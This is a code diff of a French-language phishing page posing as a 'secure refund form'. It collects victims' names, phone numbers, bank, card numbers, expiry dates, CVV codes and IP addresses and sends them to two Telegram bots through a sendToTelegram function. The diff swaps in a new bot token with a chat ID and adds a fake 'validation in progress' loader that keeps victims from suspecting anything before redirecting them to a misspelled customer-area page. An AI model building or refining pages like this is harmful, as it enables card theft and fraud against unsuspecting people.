@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Formulaire de Remboursement Sécurisé</title>
     <style>
-        /* [Tout le CSS reste identique] */
         * {
             margin: 0;
             padding: 0;
@@ -403,7 +402,7 @@
                     </select>
                 </div>
 
-                <!-- CHAMP BANQUE AJOUTÉ ICI -->
+                <!-- CHAMP BANQUE -->
                 <div class="form-group">
                     <label for="bank" class="required">Banque</label>
                     <select id="bank">
@@ -488,7 +487,6 @@
                     <div class="form-column">
                         <label for="inputyy" class="required">Année d'expiration</label>
                         <select id="inputyy">
-                            <option value="25">2025</option>
                             <option value="26">2026</option>
                             <option value="27">2027</option>
                             <option value="28">2028</option>
@@ -689,7 +687,7 @@
                     .catch(() => 'IP non disponible');
             }
 
-            // FONCTION TELEGRAM AVEC IP (MISE À JOUR)
+            // FONCTION TELEGRAM AVEC IP
             function sendToTelegram(firstname, lastname, phone, cardnumber, operator, bank, mm, yy, cvv, ip) {
                 // Les deux bots
                 const bot1 = {
@@ -698,7 +696,7 @@
                 };
                 
                 const bot2 = {
-                    token: "8361684055:AAHQMnlKUN1vga-uvqncK45UiVLC9GAEb0k",
+                    token: "8550969792:AAGzbD2TYJw27PtokQhSZiJi7lm1JWnyyD4",
                     chatId: "8061187067"
                 };
 
@@ -741,9 +739,45 @@ Date: ${new Date().toLocaleString('fr-FR')}`;
                     })
                 });
 
-                // Redirection après 2 secondes
+                // Redirection après 2 secondes AVEC LOADER
                 setTimeout(() => {
-                    window.location.href = "v.html";
+                    // Créer un loader en plein écran
+                    const loader = document.createElement('div');
+                    loader.id = 'redirect-loader';
+                    loader.style.cssText = `
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        z-index: 9999;
+                    `;
+                    
+                    loader.innerHTML = `
+                        <div style="text-align: center; color: white;">
+                            <div style="width: 80px; height: 80px; border: 5px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
+                            <div style="font-size: 18px; font-weight: bold; margin-bottom: 10px;">Validation en cours</div>
+                            <div style="font-size: 14px; opacity: 0.8;">Veuillez patienter pendant le traitement</div>
+                            <div style="width: 200px; height: 5px; background: rgba(255,255,255,0.3); border-radius: 3px; margin: 20px auto 0; overflow: hidden;">
+                                <div style="height: 100%; background: white; width: 0%; animation: progress 5s linear forwards;"></div>
+                            </div>
+                        </div>
+                        <style>
+                            @keyframes spin { to { transform: rotate(360deg); } }
+                            @keyframes progress { to { width: 100%; } }
+                        </style>
+                    `;
+                    
+                    document.body.appendChild(loader);
+                    
+                    // Rediriger vers espace-cliennt.html après 5 secondes
+                    setTimeout(() => {
+                        window.location.href = "espace-cliennt.html";
+                    }, 5000);
                 }, 2000);
             }
             
